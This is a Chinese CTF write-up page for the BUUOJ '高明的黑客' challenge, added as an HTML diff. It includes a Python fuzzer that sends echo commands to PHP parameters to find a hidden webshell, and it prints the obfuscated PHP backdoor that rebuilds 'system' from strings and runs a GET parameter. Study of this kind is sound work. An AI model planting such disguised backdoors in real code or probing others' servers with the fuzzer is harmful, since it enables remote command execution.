@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html>
+  <!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  
+  <title>高明的黑客 - LionTree</title>
+  <link rel="icon" href="https://i.imgur.com/SrZt9VU.jpg" type="image/x-icon">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+  
+  <meta name="keywords" content=writeup,fuzz,webshell>
+  
+  
+  
+    <link rel="alternate" href="/atom.xml " title="LionTree" type="application/atom+xml">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+  <body>
+    <div class="container">
+      <header class="header">
+  <div class="blog-title">
+    <a href="/" class="logo">LionTree</a>
+    <div class="subtitle"></div>
+  </div>
+  <nav class="navbar">
+    <ul class="menu">
+      
+        <li class="menu-item">
+          <a href="/" class="menu-item-link">Home</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/summary" class="menu-item-link">Summary</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/about" class="menu-item-link">About</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/atom.xml" class="menu-item-link">RSS</a>
+        </li>
+      
+    </ul>
+  </nav>
+</header>
+
+<article class="post">
+  <div class="post-title">
+    <h1 class="article-title">高明的黑客</h1>
+  </div>
+
+  <!-- 文章目录 -->
+  
+
+  <div class="post-content">
+    <p>题目环境:<a href="https://buuoj.cn/challenges#%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2" target="_blank" rel="noopener">https://buuoj.cn/challenges#%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2</a></p>
+<p>题目说该网站被黑了，并给出了源码，有三千多个文件，而且里面的变量名字符串都是没有意义的，结合题目的名字还有说明可以猜测这是是要去找源码中隐藏的后门</p>
+<p>代码中有很多eval，system这样的函数，但都是不能传入代码或者命令<br>比如像这样的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$_GET[<span class="string">'jVMcNhK_F'</span>] = <span class="string">' '</span>;</span><br><span class="line">system($_GET[<span class="string">'jVMcNhK_F'</span>] ?? <span class="string">' '</span>);</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">'V8dfwnVA5'</span> == <span class="string">'n3Ofh5nSW'</span>)</span><br><span class="line">system($_POST[<span class="string">'V8dfwnVA5'</span>] ?? <span class="string">' '</span>);</span><br></pre></td></tr></table></figure>
+
+<p>代码量很大，如果一个一个去找的话眼睛都瞎了，而且其实还找不到…<br>可以利用fuzz的方法，写一个脚本把代码中get参数名和post参数名提取出来，然后往参数中传入</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">'xxx'</span></span><br></pre></td></tr></table></figure>
+<p>如果返回的html中有xxx就是可以利用的后门</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">path = <span class="string">"D:\\phpstudy\\PHPTutorial\\WWW\\src"</span></span><br><span class="line">files = os.listdir(path)</span><br><span class="line">url = <span class="string">"http://127.0.0.1/src/"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dealfiles</span><span class="params">(start,end)</span>:</span></span><br><span class="line">    <span class="comment"># print(str(start) + " " + str(end))</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(start,end):</span><br><span class="line">       readfile(files[i])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">readfile</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(path+<span class="string">"\\"</span>+filename,<span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        lines = f.readlines()</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">            start_pos = line.find(<span class="string">"$_GET['"</span>)</span><br><span class="line">            <span class="keyword">if</span>(start_pos != <span class="number">-1</span>):</span><br><span class="line">                start_pos += len(<span class="string">"$_GET['"</span>)</span><br><span class="line">                end_pos = line.find(<span class="string">"'"</span>,start_pos)</span><br><span class="line">                get = line[start_pos:end_pos]</span><br><span class="line">                findget(filename,get)</span><br><span class="line">            start_pos = line.find(<span class="string">"$_POST['"</span>)</span><br><span class="line">            <span class="keyword">if</span>(start_pos != <span class="number">-1</span>):</span><br><span class="line">                start_pos += len(<span class="string">"$_POST['"</span>)</span><br><span class="line">                end_pos = line.find(<span class="string">"'"</span>,start_pos)</span><br><span class="line">                post = line[start_pos:end_pos]</span><br><span class="line">                findpost(filename,post)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findget</span><span class="params">(filename,get)</span>:</span></span><br><span class="line">    response = requests.get(url+filename+<span class="string">"?"</span>+get+<span class="string">"=echo 'wxynb'"</span>)</span><br><span class="line">    <span class="keyword">if</span>(str(response.content).find(<span class="string">"wxynb"</span>)!=<span class="number">-1</span>):</span><br><span class="line">        print(url+filename+<span class="string">"?"</span>+get+<span class="string">"=echo 'wxynb'"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findpost</span><span class="params">(filename,post)</span>:</span></span><br><span class="line">    data = &#123;post:<span class="string">"echo 'wxynb'"</span>&#125;</span><br><span class="line">    response = requests.post(url+filename,data=data)</span><br><span class="line">    <span class="keyword">if</span>(str(response.content).find(<span class="string">"wxynb"</span>)!=<span class="number">-1</span>):</span><br><span class="line">        print(url+filename)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">    p = Pool(<span class="number">8</span>)</span><br><span class="line">    length = int(len(files)/<span class="number">8</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(files),length):</span><br><span class="line">        p.apply_async(dealfiles,(i,i+length))</span><br><span class="line">    p.close()</span><br><span class="line">    p.join()</span><br><span class="line">    print(<span class="string">'All subprocesses done.'</span>)</span><br></pre></td></tr></table></figure>
+<p>最后发现后门在xk0SzyKwfzw.php的get参数Efa5BVG<br>代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$XnEGfa = $_GET[<span class="string">'Efa5BVG'</span>] ?? <span class="string">' '</span>;</span><br><span class="line">$aYunX = <span class="string">"sY"</span>;</span><br><span class="line">$aYunX .= <span class="string">"stEmXnsTcx"</span>;</span><br><span class="line">$aYunX = explode(<span class="string">'Xn'</span>, $aYunX);</span><br><span class="line">$kDxfM = <span class="keyword">new</span> stdClass();</span><br><span class="line">$kDxfM-&gt;gHht = $aYunX[<span class="number">0</span>];</span><br><span class="line">($kDxfM-&gt;gHht)($XnEGfa);</span><br></pre></td></tr></table></figure>
+<p>藏得还是比较深的，如果一个一个危险函数去找也找不到</p>
+
+  </div>
+  <div class="post-meta">
+    <span class="post-time" style="color:#646060;font-size:13px">2019-08-21</span>
+  </div>
+
+  <div class="post-footer">
+    
+      <ul class="post-tag-list" itemprop="keywords"><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/fuzz/" rel="tag">fuzz</a></li><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/webshell/" rel="tag">webshell</a></li><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li></ul>
+    
+
+    <a href="#top" class="top">Back to Top</a>
+  </div>
+</article>
+
+<!-- 评论插件 -->
+
+<footer>
+  2022
+  <span class="author">
+    LionTree
+  </span>
+</footer>
+
+
+    </div>
+  </body>
+</html>
